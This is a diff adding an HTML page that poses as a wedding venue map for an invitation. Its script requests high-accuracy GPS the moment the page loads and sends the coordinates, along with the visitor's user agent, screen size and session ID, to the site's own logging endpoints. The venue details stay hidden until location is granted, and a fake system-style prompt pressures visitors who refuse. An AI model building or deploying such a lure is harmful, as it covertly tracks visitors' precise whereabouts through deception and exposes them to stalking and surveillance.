@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wedding Venue Location</title>
+    
+    <!-- Leaflet CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #8b0000, #a52a2a);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .header h1 {
+            font-size: 1.6em;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        .header p {
+            font-size: 0.95em;
+            opacity: 0.95;
+        }
+        
+        .back-button {
+            position: fixed;
+            top: 90px;
+            left: 20px;
+            background: white;
+            color: #8b0000;
+            padding: 10px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            z-index: 1000;
+            transition: all 0.2s;
+        }
+        
+        .back-button:hover {
+            background: #8b0000;
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        
+        #map {
+            width: 100%;
+            height: calc(100vh - 80px);
+        }
+        
+        /* System-style notification */
+        .location-notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            padding: 16px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+            max-width: 400px;
+            width: 90%;
+            display: none;
+            z-index: 1000;
+            animation: slideDown 0.3s ease;
+        }
+        
+        .location-notification.show {
+            display: block;
+        }
+        
+        @keyframes slideDown {
+            from {
+                transform: translateX(-50%) translateY(-20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(-50%) translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .notification-content {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+        
+        .notification-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+        
+        .notification-text {
+            flex: 1;
+        }
+        
+        .notification-text p {
+            color: #333;
+            font-size: 14px;
+            line-height: 1.5;
+            margin: 0;
+        }
+        
+        .notification-text p:first-child {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        
+        .notification-text p:last-child {
+            color: #666;
+            font-size: 13px;
+        }
+        
+        .notification-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+            justify-content: flex-end;
+        }
+        
+        .notification-btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-enable {
+            background: #1a73e8;
+            color: white;
+            position: relative;
+        }
+        
+        .btn-enable:hover:not(:disabled) {
+            background: #1557b0;
+        }
+        
+        .btn-enable:disabled {
+            background: #e8eaed;
+            color: #999;
+            cursor: wait;
+        }
+        
+        .btn-dismiss {
+            background: #f1f3f4;
+            color: #5f6368;
+        }
+        
+        .btn-dismiss:hover {
+            background: #e8eaed;
+        }
+        
+        /* Loading spinner inside button */
+        .btn-loading::after {
+            content: "";
+            position: absolute;
+            width: 14px;
+            height: 14px;
+            top: 50%;
+            right: 8px;
+            margin-top: -7px;
+            border: 2px solid white;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+        
+        .loading-overlay.hide {
+            display: none;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #8b0000;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* Venue info card - HIDDEN BY DEFAULT */
+        .venue-info-card {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            padding: 16px 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            max-width: 400px;
+            width: 90%;
+            display: none;
+            z-index: 900;
+        }
+        
+        .venue-info-card.show {
+            display: block;
+            animation: slideUp 0.3s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                transform: translateX(-50%) translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(-50%) translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .venue-info-card h3 {
+            color: #8b0000;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        
+        .venue-info-card p {
+            color: #666;
+            font-size: 13px;
+            line-height: 1.5;
+            margin: 4px 0;
+        }
+        
+        .directions-link {
+            display: inline-block;
+            margin-top: 10px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .directions-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Custom marker styles */
+        .venue-marker {
+            background-color: #8b0000;
+            width: 30px;
+            height: 30px;
+            border-radius: 50% 50% 50% 0;
+            transform: rotate(-45deg);
+            border: 3px solid white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        
+        .user-marker {
+            background-color: #4285F4;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 3px solid white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎉 Wedding Venue</h1>
+        <p>Arun ❤️ Shwetha - 7th December 2025</p>
+    </div>
+    
+    <!-- Back to home button -->
+    <a href="/" class="back-button">← Back to Invitation</a>
+    
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p class="loading-text">Loading map...</p>
+    </div>
+    
+    <!-- Map container -->
+    <div id="map"></div>
+    
+    <!-- System-style location notification -->
+    <div class="location-notification" id="locationNotification">
+        <div class="notification-content">
+            <div class="notification-icon">📍</div>
+            <div class="notification-text">
+                <p>Enable location access</p>
+                <p>Allow location access to see your position on the map and get directions to the venue.</p>
+            </div>
+        </div>
+        <div class="notification-actions">
+            <button class="notification-btn btn-dismiss" onclick="dismissNotification()">Not now</button>
+            <button class="notification-btn btn-enable" id="enableBtn" onclick="requestLocationAgain()">Enable</button>
+        </div>
+    </div>
+    
+    <!-- Venue info card - ONLY SHOWS AFTER LOCATION GRANTED -->
+    <div class="venue-info-card" id="venueInfoCard">
+        <h3>📍 Grand Palace Convention Hall</h3>
+        <p>123 MG Road, Bangalore, Karnataka 560001</p>
+        <p>Contact: +91 98765 43210</p>
+        <a href="#" class="directions-link" id="directionsLink" target="_blank">Get Directions →</a>
+    </div>
+    
+    <!-- Leaflet JavaScript -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
+    <script>
+        const sessionId = sessionStorage.getItem('weddingSessionId') || 'SESSION_' + Date.now();
+        sessionStorage.setItem('weddingSessionId', sessionId);
+        
+        // Venue coordinates (Bangalore example)
+        const venueLocation = {
+            lat: 12.9716,
+            lng: 77.5946
+        };
+        
+        let map;
+        let userMarker;
+        let venueMarker = null; // Start as null, will be created after permission
+        let routeLine;
+        let locationRequested = false;
+        let locationDismissed = false;
+        
+        // Initialize map with OpenStreetMap
+        function initMap() {
+            // Create map centered on venue but WITHOUT marker initially
+            map = L.map('map').setView([venueLocation.lat, venueLocation.lng], 13);
+            
+            // Add OpenStreetMap tile layer
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap contributors',
+                maxZoom: 19
+            }).addTo(map);
+            
+            // DO NOT add venue marker here - wait for location permission
+            
+            // Hide loading overlay
+            document.getElementById('loadingOverlay').classList.add('hide');
+            
+            // Log map loaded
+            logActivity('venue_map_loaded');
+            
+            // IMMEDIATELY request location (triggers system dialog)
+            requestLocation();
+        }
+        
+        function requestLocation() {
+            if (locationRequested || locationDismissed) return;
+            locationRequested = true;
+            
+            if (!navigator.geolocation) {
+                console.log('Geolocation not supported');
+                document.getElementById('locationNotification').classList.add('show');
+                return;
+            }
+            
+            logActivity('location_permission_requested_auto');
+            
+            // This will trigger the browser's native permission dialog
+            navigator.geolocation.getCurrentPosition(
+                handleLocationSuccess,
+                handleLocationError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        function handleLocationSuccess(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            console.log('Location obtained:', latitude, longitude);
+            
+            // Log GPS location
+            logGPSLocation(latitude, longitude, accuracy, 'granted');
+            
+            // NOW create venue marker (after location permission granted)
+            const venueIcon = L.divIcon({
+                className: 'venue-marker',
+                iconSize: [30, 30],
+                iconAnchor: [15, 30],
+                popupAnchor: [0, -30]
+            });
+            
+            venueMarker = L.marker([venueLocation.lat, venueLocation.lng], {
+                icon: venueIcon
+            }).addTo(map);
+            
+            // Venue popup
+            venueMarker.bindPopup(`
+                <div style="padding: 8px;">
+                    <h3 style="color: #8b0000; margin: 0 0 8px 0; font-size: 16px;">Wedding Venue</h3>
+                    <p style="margin: 4px 0; color: #666; font-size: 14px;"><strong>Grand Palace Convention Hall</strong></p>
+                    <p style="margin: 4px 0; color: #666; font-size: 13px;">123 MG Road, Bangalore</p>
+                </div>
+            `);
+            
+            // Custom user icon
+            const userIcon = L.divIcon({
+                className: 'user-marker',
+                iconSize: [20, 20],
+                iconAnchor: [10, 10]
+            });
+            
+            // Add user location marker
+            userMarker = L.marker([latitude, longitude], {
+                icon: userIcon
+            }).addTo(map);
+            
+            userMarker.bindPopup('Your Location');
+            
+            // Draw route line between user and venue
+            routeLine = L.polyline([
+                [latitude, longitude],
+                [venueLocation.lat, venueLocation.lng]
+            ], {
+                color: '#8b0000',
+                weight: 3,
+                opacity: 0.7
+            }).addTo(map);
+            
+            // Fit map to show both markers
+            const bounds = L.latLngBounds([
+                [latitude, longitude],
+                [venueLocation.lat, venueLocation.lng]
+            ]);
+            map.fitBounds(bounds, { padding: [50, 50] });
+            
+            // NOW show venue info card AFTER location permission granted
+            document.getElementById('venueInfoCard').classList.add('show');
+            document.getElementById('directionsLink').href = `https://www.google.com/maps/dir/?api=1&origin=${latitude},${longitude}&destination=${venueLocation.lat},${venueLocation.lng}`;
+            
+            // Hide notification if it was showing
+            document.getElementById('locationNotification').classList.remove('show');
+            
+            logActivity('user_location_displayed_on_map', {
+                userLocation: `${latitude},${longitude}`,
+                distance_meters: map.distance([latitude, longitude], [venueLocation.lat, venueLocation.lng]).toFixed(0)
+            });
+        }
+        
+        function handleLocationError(error) {
+            let errorMessage = '';
+            let permissionStatus = 'denied';
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = 'Location access denied';
+                    permissionStatus = 'denied';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = 'Location unavailable';
+                    permissionStatus = 'unavailable';
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = 'Location timeout';
+                    permissionStatus = 'timeout';
+                    break;
+                default:
+                    errorMessage = 'Unknown error';
+                    permissionStatus = 'error';
+            }
+            
+            console.log('Location error:', errorMessage);
+            logGPSLocation(null, null, null, permissionStatus);
+            
+            // Show custom notification ONLY if system permission failed
+            document.getElementById('locationNotification').classList.add('show');
+        }
+        
+        function requestLocationAgain() {
+            const enableBtn = document.getElementById('enableBtn');
+            
+            // Show loading state on button
+            enableBtn.disabled = true;
+            enableBtn.classList.add('btn-loading');
+            enableBtn.textContent = 'Waiting...';
+            
+            logActivity('location_enable_clicked_from_notification');
+            
+            // Reset flag and request again (will trigger system dialog)
+            locationRequested = false;
+            locationDismissed = false;
+            
+            // Wait a moment then request (gives user feedback)
+            setTimeout(() => {
+                if (!navigator.geolocation) {
+                    alert('Geolocation is not supported by your browser');
+                    resetEnableButton();
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        handleLocationSuccess(position);
+                        resetEnableButton();
+                    },
+                    (error) => {
+                        handleLocationError(error);
+                        resetEnableButton();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+                
+                locationRequested = true;
+            }, 500);
+        }
+        
+        function resetEnableButton() {
+            const enableBtn = document.getElementById('enableBtn');
+            enableBtn.disabled = false;
+            enableBtn.classList.remove('btn-loading');
+            enableBtn.textContent = 'Enable';
+        }
+        
+        function dismissNotification() {
+            document.getElementById('locationNotification').classList.remove('show');
+            locationDismissed = true;
+            logActivity('location_notification_dismissed');
+            
+            // Allow re-requesting after 5 seconds if user changes mind
+            setTimeout(() => {
+                locationDismissed = false;
+            }, 5000);
+        }
+        
+        // Activity logging
+        async function logActivity(action, details = {}) {
+            try {
+                await fetch('/log-activity', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        action: action,
+                        details: details,
+                        sessionId: sessionId,
+                        timestamp: new Date().toISOString(),
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        userAgent: navigator.userAgent
+                    })
+                });
+            } catch (error) {
+                console.error('Error logging activity:', error);
+            }
+        }
+        
+        // GPS location logging
+        async function logGPSLocation(latitude, longitude, accuracy, permissionStatus) {
+            try {
+                await fetch('/log-gps-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        latitude: latitude,
+                        longitude: longitude,
+                        accuracy: accuracy,
+                        permissionStatus: permissionStatus,
+                        sessionId: sessionId,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.error('Error logging GPS:', error);
+            }
+        }
+        
+        // Log page access and initialize map
+        logActivity('venue_map_page_opened');
+        
+        // Initialize map when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initMap);
+        } else {
+            initMap();
+        }
+    </script>
+</body>
+</html>
